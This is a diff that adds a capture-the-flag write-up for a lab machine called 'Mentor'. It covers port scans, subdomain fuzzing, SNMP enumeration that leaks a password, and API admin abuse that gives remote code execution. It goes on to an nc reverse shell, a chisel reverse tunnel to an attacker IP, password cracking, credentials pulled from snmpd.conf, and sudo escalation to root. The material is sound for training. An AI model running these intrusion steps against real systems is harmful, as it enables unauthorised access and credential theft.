@@ -1018,3 +1018,371 @@ bash-5.1# cat /root/root.txt
 6........................43
 ```
 
+
+# MENTOR
+---
+
+
+![image](./assets/img/mentor.png)
+
+<br /><br />
+---
+
+* MACHINE:Mentor
+* Level: medium
+* IP: 10.10.11.193
+
+
+---
+``` bash
+# Nmap 7.93 scan initiated Wed Jan 18 18:57:54 2023 as: nmap -v -sV -A -Pn -oN scanSimple 10.10.11.193
+Nmap scan report for 10.10.11.193
+Host is up (0.10s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE      VERSION
+22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
+|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
+80/tcp    open     http         Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://mentorquotes.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+4002/tcp  filtered mlchat-proxy
+10082/tcp filtered amandaidx
+49155/tcp filtered unknown
+Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 18 18:58:13 2023 -- 1 IP address (1 host up) scanned in 19.08 seconds
+
+```
+
+``` bash
+❯ nmap -sU -oN scanUDP 10.10.11.193
+# Nmap 7.93 scan initiated Wed Jan 18 19:01:32 2023 as: nmap -sU -oN scanUDP 10.10.11.193
+Nmap scan report for mentorquotes.htb (10.10.11.193)
+Host is up (0.087s latency).
+Not shown: 998 closed udp ports (port-unreach)
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+
+# Nmap done at Wed Jan 18 19:18:21 2023 -- 1 IP address (1 host up) scanned in 1009.63 seconds
+```
+
+``` bash
+❯ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 404 -H "Host: FUZZ.mentorquotes.htb" -u "http://mentorquotes.htb"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://mentorquotes.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                 
+=====================================================================
+
+000000051:   404        0 L      2 W        22 Ch       "api"                                                   
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 0
+```
+![image](./assets/img/mentor-api-url1.png)
+
+
+![image](./assets/img/mentor-dirsearch.png)
+
+
+* Open http://api.mentorquotes.htb/docs
+* Found mentor admin email **james@mentorquotes.htb**
+
+![image](./assets/img/mentor-api-url1.png)
+
+* Now let's try to create a new user, we will use burp 
+* I use FoxyProxy for firefox 
+* Intercept the Try it out button from:
+* http://api.mentorquotes.htb/docs#/Auth/create_user_auth_signup_post
+
+![image](./assets/img/mentor-burpsuite1.png)
+
+
+* Do the same for te login and we receive a JasonWebToken
+
+
+
+![image](./assets/img/mentor-burpsuite3.png)
+
+* Test a bit with this api possibilities 
+* The JWT above is not working as authorization when we want to list users in the api url.
+* As shown below, got an interesting finding enumerating the snmp with snmp-brute and snmpwalk.
+* Try to login as james with the password below and see if we succeed.
+
+``` bash
+❯ snmpwalk -c internal -v2c 10.10.11.193 > snmp.txt
+...
+
+HOST-RESOURCES-MIB::hrSWRunPath.2057 = STRING: "/usr/local/bin/python3"
+HOST-RESOURCES-MIB::hrSWRunPath.2058 = STRING: "/usr/local/bin/python3"
+HOST-RESOURCES-MIB::hrSWRunParameters.1692 = STRING: "/usr/local/bin/login.sh"
+HOST-RESOURCES-MIB::hrSWRunParameters.2228 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
+...
+```
+
+* Used burpsuite to login as James and works
+* We retrieve JWT from james so we may now list users
+
+![image](./assets/img/mentor-jamesJWT.png)
+
+![image](./assets/img/mentor-burpsuite4.png)
+
+![image](./assets/img/mentor-burpsuite5.png)
+
+* And we can retrieve two functions from /admin/
+* Test the functions
+* check is not implemented
+* Backup is available with some modifications done from burp repeater
+
+![image](./assets/img/mentor-burpsuite7.png)
+![image](./assets/img/mentor-burpsuite8.png)
+![image](./assets/img/mentor-burpsuite9.png)
+![image](./assets/img/mentor-burpsuite10.png)
+
+* As now it works and have RCE 
+* Check if we could connect to our machine
+
+![image](./assets/img/mentor-burpsuite11.png)
+
+* We get the reverse connection with pwncat but fils on jumping to the session
+
+![image](./assets/img/mentor-burpsuite12.png)
+
+* But using _nc_ works and we get the reverse shell
+
+``` bash
+❯ nc -lnvp 8000
+Connection from 10.10.11.193:32869
+/bin/sh: can't access tty; job control turned off
+/app # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/app # 
+
+```
+* We find something interesting app/ directory
+
+``` bash
+/app/app # cat db.py
+import os
+
+from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+from sqlalchemy.sql import func
+from databases import Database
+
+# Database url if none is passed the default one is used
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
+
+# SQLAlchemy for quotes
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+quotes = Table(
+    "quotes",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("title", String(50)),
+    Column("description", String(50)),
+    Column("created_date", DateTime, default=func.now(), nullable=False)
+)
+
+# SQLAlchemy for users
+engine = create_engine(DATABASE_URL)
+metadata = MetaData()
+users = Table(
+    "users",
+    metadata,
+    Column("id", Integer, primary_key=True),
+    Column("email", String(50)),
+    Column("username", String(50)),
+    Column("password", String(128) ,nullable=False)
+)
+
+
+# Databases query builder
+database = Database(DATABASE_URL)
+```
+
+* Now we should find a way to connect to the database
+* We use chisel tool for port forwarding
+* For interacting with PostgreSQL database, we need to forward * the port with chisel, which I have to install
+* Binary used from main repo chisel_1.7.7_linux_amd64.gz wget it to the victim machine
+* SERVER: chisel server --port 9002 --reverse
+* CLIENT: ./chisel client -v attackerIP:9002 R:5432:172.22.0.1:5432
+
+
+![image](./assets/img/mentor-tunneling-chisel.png)
+
+* Try to retrieve those passwords with crackstation
+* We only succeed with one
+
+
+![image](./assets/img/mentor-CrackStation.png)
+
+* SSH to the box as svc with provided credentials works
+* Get the user flag
+* Nmap report from the enumeration shows open snmp
+
+``` bash
+nmap -sU -oN scanUDP 
+       │ 10.10.11.193
+   2   │ Nmap scan report for mentorquotes.htb (10.10.11.193)
+   3   │ Host is up (0.087s latency).
+   4   │ Not shown: 998 closed udp ports (port-unreach)
+   5   │ PORT    STATE         SERVICE
+   6   │ 68/udp  open|filtered dhcpc
+   7   │ 161/udp open          snmp
+```
+
+* Exploring for some files we found pwd in snmpd.conf
+
+``` bash
+svc@mentor:~$ cat /etc/snmp/snmpd.conf
+###########################################################################
+#
+# snmpd.conf
+# An example configuration file for configuring the Net-SNMP agent ('snmpd')
+# See snmpd.conf(5) man page for details
+#
+###########################################################################
+# SECTION: System Information Setup
+#
+
+# syslocation: The [typically physical] location of the system.
+#   Note that setting this value here means that when trying to
+#   perform an snmp SET operation to the sysLocation.0 variable will make
+#   the agent return the "notWritable" error code.  IE, including
+#   this token in the snmpd.conf file will disable write access to
+#   the variable.
+#   arguments:  location_string
+sysLocation    Sitting on the Dock of the Bay
+sysContact     Me <admin@mentorquotes.htb>
+
+# sysservices: The proper value for the sysServices object.
+#   arguments:  sysservices_number
+sysServices    72
+
+
+
+###########################################################################
+# SECTION: Agent Operating Mode
+#
+#   This section defines how the agent will operate when it
+#   is running.
+
+# master: Should the agent operate as a master agent or not.
+#   Currently, the only supported master agent type for this t
+#   is "agentx".
+#   
+#   arguments: (on|yes|agentx|all|off|no)
+
+master  agentx
+
+# agentaddress: The IP address and port number that the agent will listen on.
+#   By default the agent listens to any and all traffic from any
+#   interface on the default SNMP port (161).  This allows you to
+#   specify which address, interface, transport type and port(s) that you
+#   want the agent to listen on.  Multiple definitions of this token
+#   are concatenated together (using ':'s).
+#   arguments: [transport:]port[@interface/address],...
+
+# agentaddress  127.0.0.1,[::1]
+agentAddress udp:161,udp6:[::1]:161
+
+
+###########################################################################
+# SECTION: Access Control Setup
+#
+#   This section defines who is allowed to talk to your running
+#   snmp agent.
+
+# Views 
+#   arguments viewname included [oid]
+
+#  system + hrSystem groups only
+view   systemonly  included   .1.3.6.1.2.1.1
+view   systemonly  included   .1.3.6.1.2.1.25.1
+
+
+# rocommunity: a SNMPv1/SNMPv2c read-only access community name
+#   arguments:  community [default|hostname|network/bits] [oid | -V view]
+
+# Read-only access to everyone to the systemonly view
+rocommunity  public default -V systemonly
+rocommunity6 public default -V systemonly
+
+# SNMPv3 doesn't use communities, but users with (optionally) an
+# authentication and encryption string. This user needs to be created
+# with what they can view with rouser/rwuser lines in this file.
+#
+# createUser username (MD5|SHA|SHA-512|SHA-384|SHA-256|SHA-224) authpassphrase [DES|AES] [privpassphrase]
+# e.g.
+# createuser authPrivUser SHA-512 myauthphrase AES myprivphrase
+#
+# This should be put into /var/lib/snmp/snmpd.conf 
+#
+# rouser: a SNMPv3 read-only access username
+#    arguments: username [noauth|auth|priv [OID | -V VIEW [CONTEXT]]]
+rouser authPrivUser authpriv -V systemonly
+
+# include a all *.conf files in a directory
+includeDir /etc/snmp/snmpd.conf.d
+
+
+createUser bootstrap MD5 SuperSecurePassword123__ DES
+rouser bootstrap priv
+
+com2sec AllUser default internal
+group AllGroup v2c AllUser
+#view SystemView included .1.3.6.1.2.1.1
+view SystemView included .1.3.6.1.2.1.25.1.1
+view AllView included .1
+access AllGroup "" any noauth exact AllView none none
+svc@mentor:~$   
+```
+* now we try if we can login as james with the password found in snmpd.conf
+
+
+``` bash
+vc@mentor:~$ su james                                                          
+Password: 
+james@mentor:/home/svc$ cd
+james@mentor:~$ pwd
+/home/james
+```
+* Now we are james just need to find the way to escalate to root
+* Start checking with sudo permissions
+
+``` bash
+james@mentor:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on mentor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+james@mentor:~$ sudo su
+Sorry, user james is not allowed to execute '/usr/bin/su' as root on mentor.
+james@mentor:~$ sudo /bin/sh
+# cd ~
+# pwd
+/root
+# cat root.txt
+c4.......................c7
+
+```
+![image](./assets/img/mentor-UserFlag.png)
